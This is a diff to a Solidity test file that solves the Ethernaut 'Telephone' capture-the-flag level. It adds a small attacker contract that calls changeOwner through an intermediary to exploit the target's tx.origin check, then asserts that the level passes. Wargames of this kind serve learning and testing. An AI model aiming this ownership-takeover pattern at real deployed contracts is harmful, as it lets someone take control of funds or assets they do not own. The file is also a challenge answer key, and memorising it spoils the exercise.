@@ -5,6 +5,18 @@ import "../Telephone/TelephoneFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneAttacker {
+    constructor() {}
+
+    function attack(address _target, address _newOwner) external {
+        ITelephone(_target).changeOwner(_newOwner);
+    }
+}
+
 contract TelephoneHack is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
@@ -34,13 +46,21 @@ contract TelephoneHack is DSTest {
         Telephone ethernaughtTelephone = Telephone(payable(levelAddress));
 
         // =========================  ATTACK
+        TelephoneAttacker attacker = new TelephoneAttacker();
+        emit log_named_address(
+            "previous owner: ",
+            ethernaughtTelephone.owner()
+        );
+
+        attacker.attack(address(ethernaughtTelephone), eoaAddress);
+        emit log_named_address("new owner: ", ethernaughtTelephone.owner());
 
         // ========================= SUBMISSION
 
-        // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-        //     payable(levelAddress)
-        // );
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
+        assert(levelSuccessfullyPassed);
     }
 }
